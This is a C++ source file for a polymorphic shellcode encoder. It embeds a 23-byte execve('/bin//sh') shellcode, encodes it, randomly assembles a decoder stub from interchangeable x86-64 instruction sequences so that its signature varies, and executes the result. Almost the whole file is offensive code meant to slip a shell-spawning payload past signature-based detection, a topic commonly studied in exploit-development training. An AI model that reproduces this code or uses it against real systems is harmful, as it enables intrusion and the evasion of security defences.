#include <iostream>
#include <cstring>
#include <string>
#include <cstdlib>

using namespace std;

unsigned char payload[] = "\x31\xf6\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";
/*
Execve shellcode 23 bytes :

    xor esi, esi
    mul esi
    push rax
    mov rdi, 0x68732f2f6e69622f
    push rdi          
    mov rdi, rsp           
    mov al, 59
    syscall
*/

// Get memory address intructions set
string  mem_addr[2] = {
            "\xd9\xe4\x54\x5b\x66\x83\xe3\xf0\x31\xc0\x66\xb8\x10\x02\x48\x01\xc3\x48\x0f\xae\x03\x48\x8b\x73\x08",
            "\x48\x8d\x35\xf9\xff\xff\xff"
};

// Two's complement instructions set
string two_compl[] = {
            "\xf6\x1e",
            "\x31\xc0\x2a\x06\x88\x06",
            "\xf6\x16\xfe\x06"
};

// Increment rsi instructions set
string incr_rsi [2] = {
            "\x48\xff\xc6",
            "\x48\x83\xc6\x01"
};

// Loops instructions set, minus the address byte that will be calculated
// according to the instructions drawn
string loop[2] = {
            "\x48\xff\xc9\x75",
            "\xe0"
};


// Assemble and return a decoder stub
string generate_stub() {

    // Randomly select one option of each set of instructions
    // Calculate the byte size
    srand(time(NULL));
    string parts[4];
    unsigned char size = 0;
    parts[0] = mem_addr[rand() %2];
    size += parts[0].size();

    parts[1] = two_compl[rand() %3];
    size += parts[1].size();

    parts[2] = incr_rsi[rand() %2];
    size += parts[2].size();

    parts[3] = loop[rand() % 2];
    parts[3].push_back((char)(- parts[1].size() - parts[2].size() - (parts[3].size()+1)));
    size += parts[3].size();

    // size of the counter initialization and RSI adjustment
    size += 7;

    // RSI adjustment
    string adjust = "\x48\x83\xc6";
    adjust.push_back(size); 

    // Counter initialization with the payload size
    string str_count = {'\x6a', (unsigned char) sizeof(payload) -1, '\x59'};

    // Assemble and return the decoder stub
    return parts[0] + adjust + str_count + parts[1] + parts[2] + parts[3];
}

/* Set your custom shellcode here */
int main() {

    unsigned char encoded[sizeof(payload)];
    
    // Encode the payload
    for(int i = 0; i < (int) sizeof(payload); i++) {
        unsigned char c = payload[i] - 1;
        encoded[i] = ~c;
    }

    // Generate a decoder stub
    string stub = generate_stub();

    // Display the sizes
    cout << "Decoder size : " << stub.size() << endl;
    cout << "Shellcode size : " << sizeof(payload) - 1 << endl;

    // Append the stub and the encoded shellcode together, then execute.
    char shellcode[sizeof(stub) + sizeof(encoded)];
    strcpy(shellcode, stub.c_str());
    strcat(shellcode, (const char *)encoded);
    void (* run)() = (void (*)()) shellcode;

    run();
    return 0;
}
